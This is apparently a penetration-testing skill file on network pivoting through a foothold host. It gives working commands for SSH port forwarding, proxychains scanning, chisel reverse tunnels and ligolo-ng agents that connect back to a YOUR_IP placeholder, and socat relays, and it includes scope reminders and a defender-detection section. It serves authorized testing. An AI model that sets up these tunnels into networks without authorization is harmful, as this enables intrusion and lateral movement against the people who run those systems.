---
name: network-pivoting
description: Use when an authorized engagement gives you a foothold host and you must reach deeper network segments through it. Pivoting with SSH local, remote, and dynamic port forwarding, proxychains routing for proxyless tools, chisel TCP and UDP tunnels, ligolo-ng tun interfaces for full layer 3 access, and socat relays. Covers pivot architecture choices, agent versus agentless tradeoffs, keeping tunneled traffic stable and quiet, and the discovery loop that finds the next segment. Requires the recon-active baseline to know what to pivot toward.
version: 1.0.0
domain: network
lifecycle: stable
last_verified: 2026-10-23
requires:
  - recon-active
extends: []
relates: []
tools:
  - name: OpenSSH
    version: 9.x
  - name: proxychains
    version: "4.16"
  - name: chisel
    version: 1.10.x
  - name: ligolo-ng
    version: 0.8.x
  - name: socat
    version: 1.8.x
  - name: ncat
    version: 7.98
---

Pivoting routes your traffic through a compromised-in-scope host (the pivot)
to reach networks you cannot see directly. It is the bridge between initial
access and internal reconnaissance, and every tunnel you build must stay
inside the authorized scope. This skill covers the practical toolkit: SSH
forwarding for quick wins, proxychains to push arbitrary tools through a
SOCKS proxy, chisel for fast encrypted tunnels, ligolo-ng when you need a
real network interface on the far side, and socat for simple relays. All
examples assume the pivot host is inside your authorized scope.

## Quick Workflow

1. Enumerate from the pivot: its interfaces, routes, ARP table, and reachable neighbors.
2. Choose the pivot method: SSH forwarding for simple port access, SOCKS plus proxychains for tool routing, chisel for speed, ligolo-ng for full network access.
3. Establish the tunnel and verify it from your side with a simple probe.
4. Route your enumeration tools through the tunnel (proxychains, or the tun interface).
5. Discover the next segment and repeat, documenting every hop.
6. Tear down tunnels cleanly at the end of the engagement.

## 1. Map from the pivot first

Before building tunnels, learn what the pivot can see. Its routing table and
ARP cache are a map of the adjacent networks.

```bash
ip route show
ip addr show
arp -a
cat /etc/resolv.conf
ss -tlnp
```

Look for: extra interfaces (a second NIC often faces the internal network),
routes to subnets you cannot reach directly, and ARP entries revealing live
neighbors. Check what egress the pivot itself has, because your tunnel
traffic must flow back through it:

```bash
ping -c 2 203.0.113.1
curl -s -m 5 http://203.0.113.10/ -o /dev/null -w "%{http_code}\n"
```

## 2. SSH port forwarding

SSH is the fastest pivot when you have SSH access to the foothold. Three
modes cover most needs.

Local forwarding exposes a far-side service on your local machine:

```bash
ssh -L 8080:192.168.11.20:80 -N -f pivotuser@203.0.113.10
curl -s http://127.0.0.1:8080/ | head -20
```

Now the internal web server at 192.168.11.20:80 is reachable at your
localhost:8080. Remote forwarding does the reverse: it exposes your local
service on the far side, useful when the pivot cannot reach you directly:

```bash
ssh -R 9000:127.0.0.1:8000 -N -f pivotuser@203.0.113.10
```

Dynamic forwarding creates a SOCKS proxy on your machine; any
SOCKS-aware tool can now route through the pivot:

```bash
ssh -D 1080 -N -f pivotuser@203.0.113.10
curl -s --socks5 127.0.0.1:1080 http://192.168.11.20/ | head -20
```

Keep tunnels alive across flaky networks with keepalives in
`~/.ssh/config`:

```
Host pivot
    HostName 203.0.113.10
    User pivotuser
    ServerAliveInterval 30
    ServerAliveCountMax 3
```

## 3. proxychains: routing arbitrary tools

Many tools do not speak SOCKS. proxychains forces their TCP connections
through your SOCKS proxy by preloading a library. Configure it once:

```bash
cat /etc/proxychains4.conf | grep -v "^#" | grep -v "^$"
```

Ensure the last line reads `socks5 127.0.0.1 1080` matching your dynamic
forward. Then prefix any TCP tool:

```bash
proxychains nmap -sT -Pn --top-ports 100 192.168.11.0/24
proxychains curl -s http://192.168.11.20/ | head -20
```

Rules that matter: proxychains only handles TCP, so UDP scans and ICMP ping
will not work through it (use `-sT -Pn` with nmap). DNS through the proxy
depends on the `proxy_dns` setting; enable it so name resolution also goes
through the pivot. Expect slowness: every connection pays the tunnel cost,
so reduce port counts and thread counts versus direct scans.

## 4. chisel: fast encrypted tunnels

chisel is a single static binary, easy to drop on a pivot, and it multiplexes
many forwards over one encrypted connection. Run the server on your machine
and the client on the pivot (or reverse it when the pivot cannot accept
inbound connections).

On your machine:

```bash
chisel server -p 8000 --reverse
```

On the pivot, a reverse client exposing an internal web server back to you:

```bash
./chisel client YOUR_IP:8000 R:8080:192.168.11.20:80
```

Now `http://127.0.0.1:8080` on your machine reaches the internal server.
chisel also does SOCKS:

```bash
./chisel client YOUR_IP:8000 R:socks
proxychains nmap -sT -Pn --top-ports 50 192.168.11.0/24
```

chisel's `--reverse` flag lets the client define the forwards, which solves
the common case where your machine is not reachable from the pivot but the
pivot can reach you. Use authentication (`--auth user:pass`) so a stray
chisel client cannot attach to your server.

## 5. ligolo-ng: a real interface on the far side

When SOCKS is not enough (you need ICMP, UDP scans, or tools that bypass
proxychains), ligolo-ng gives you a tun interface with full layer 3 access.
It has two parts: the proxy on your machine and the agent on the pivot.

On your machine:

```bash
./proxy -selfcert
```

On the pivot:

```bash
./agent -connect YOUR_IP:11601 -ignore-cert
```

In the proxy console, select the session and start the tunnel:

```
session
start --tun
```

Then add a route to the internal network through the new interface:

```bash
sudo ip route add 192.168.11.0/24 dev ligolo
nmap -sn 192.168.11.0/24
```

Now ping, UDP scans, and unproxied tools work against the far network as if
you were local. This is the most powerful option and the most visible one:
a new network interface and routing changes on your machine are obvious in
forensics, which is fine for authorized work and exactly why you document it.

## 6. socat relays for single ports

For a single TCP service with no SSH and no binary drops, socat on the pivot
relays a port to the far side:

```bash
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.11.20:80 &
curl -s http://203.0.113.10:8080/ | head -20
```

The `fork` flag handles multiple connections. This is unencrypted and has no
authentication, so restrict it with firewall rules or bind to the pivot's
internal interface only, and only for the duration you need it. Kill the relay
when done; forgotten relays are a finding against you in the report.

## 7. The discovery loop

Pivoting is iterative. Each new segment you reach gets the same treatment:
enumerate interfaces and routes from the newest vantage point, look for the
next network, and extend the tunnel chain. Document every hop (pivot IP,
method, ports, purpose) in your notes; a tunnel diagram in the final report
shows the client exactly how deep the authorized path went. When chaining
multiple pivots, prefer one ligolo-ng tunnel per major segment over long
chains of SSH forwards, because each extra hop multiplies latency and failure
points.

## Edge cases

- Double NAT and egress filtering may block your tunnel's return traffic.
  Test with a simple TCP connection before assuming the tunnel works, and try
  common allowed ports (443, 53) for the tunnel transport.
- proxychains breaks tools that use raw sockets (SYN scans, OS detection).
  Always use connect scans (`-sT`) and skip host discovery (`-Pn`) through
  proxychains.
- chisel and ligolo-ng agents may be flagged by endpoint protection on the
  pivot. Check the rules of engagement for EDR testing boundaries; if
  running agents is out of scope, stay with SSH forwarding.
- SSH multiplexing (`ControlMaster`) reuses one connection for many
  forwards and avoids repeated authentication. Set it up when you need
  several simultaneous forwards.
- Tunnels die silently on network hiccups. Wrap long-running tunnels in
  autossh or a reconnect loop, and verify with a periodic probe rather than
  discovering the outage mid-scan.
- IPv6-only far networks need v6-capable tools end to end; test name
  resolution and routing for v6 explicitly instead of assuming.

## Escalation

When the pivot cannot run your tools: use agentless methods (SSH forwarding,
socat relays) instead of dropping binaries. When the pivot has no SSH and no
shell for uploads, look for existing services to abuse as relays (a web
shell is not in scope for this skill; coordinate with the exploitation
phase). When one pivot cannot see the next segment, check for multi-homed
hosts, routers, or jump boxes visible from the pivot and move the tunnel
endpoint there. When bandwidth through the chain is too low for scanning,
pivot your methodology instead: enumerate lightly through the tunnel to pick
targets, then request a better-positioned vantage point from the client
contact. Never pivot into networks outside the signed scope, no matter how
tempting the route looks.

## Detection and defender view

Defenders see pivoting as lateral movement infrastructure. SSH forwarding
shows as long-lived SSH sessions with unusual port bindings; monitor for
`-R` forwards exposing internal ports externally. chisel and ligolo-ng have
recognizable TLS fingerprints and default ports that IDS rules flag.
proxychains itself is client side and invisible, but the scanned traffic
coming from the pivot's IP is not. socat relays appear as listening ports
with no associated service. The blue team differentiates authorized
pivoting by the source, the time window, and your coordination: tell the
defensive contact which pivot hosts and methods you will use before you
start. Unexpected tunnels during an engagement trigger incident response,
even when the engagement is authorized.

## Key references

- MITRE ATT&CK T1090 Proxy
- MITRE ATT&CK T1090.001 Internal Proxy
- MITRE ATT&CK T1572 Protocol Tunneling
- MITRE ATT&CK T1105 Ingress Tool Transfer
- MITRE ATT&CK T1021.004 SSH
- CWE-200 Exposure of Sensitive Information to an Unauthorized Actor
- OpenSSH manual: https://man.openbsd.org/ssh
- chisel docs: https://github.com/jpillora/chisel
- ligolo-ng docs: https://github.com/nicocha30/ligolo-ng
- proxychains-ng docs: https://github.com/rofl0r/proxychains-ng
